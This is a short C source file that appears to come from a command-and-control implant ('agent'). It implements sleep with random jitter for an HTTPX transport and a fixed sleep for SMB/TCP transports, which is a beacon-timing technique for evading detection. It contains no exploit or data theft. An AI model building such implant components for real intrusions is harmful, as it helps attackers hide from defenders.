#include "Sleep.h"
#include "Debug.h"
#include "Utils.h"
#include "Config.h"

#ifdef HTTPX_TRANSPORT

// Function to apply jitter to the sleep time
VOID SleepWithJitter(INT baseSleepTime, INT maxJitter) {
    if (maxJitter == 0)
        goto sleep;
    
    // Define limits for jitter
    const INT minJitter = 1;  // Minimum jitter of 1 second
    const INT jitterRange = maxJitter / 2;  // Half of maxJitter as range for +/- adjustments

    // Generate jitter within the defined range
    int Rand = RandomInt32(-jitterRange, jitterRange);

    // Apply jitter to the base sleep time
    baseSleepTime += Rand;

    // Ensure the sleep time is never below the minimum threshold (e.g., 1 second)
    if (baseSleepTime < minJitter) {
        baseSleepTime = minJitter;
    }

sleep:
    _dbg("AGENT GOING TO SLEEP : %d seconds", baseSleepTime);
    // Sleep for the adjusted time (in milliseconds)
    Sleep(baseSleepTime * 1000);
}

#else // SMB_TRANSPORT & TCP_TRANSPORT

VOID SleepWithJitter(INT baseSleepTime, INT maxJitter) {

    Sleep(500);
    
}

#endif